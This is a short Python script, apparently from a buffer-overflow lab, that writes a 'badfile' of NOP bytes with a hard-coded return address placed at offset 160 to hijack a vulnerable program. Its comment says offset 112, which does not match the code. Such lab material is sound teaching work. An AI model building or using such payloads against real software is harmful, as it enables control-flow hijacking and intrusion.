import sys 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(164)) 

# Put the address at offset 112 
ret = 0x5655626d
content[160:164] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

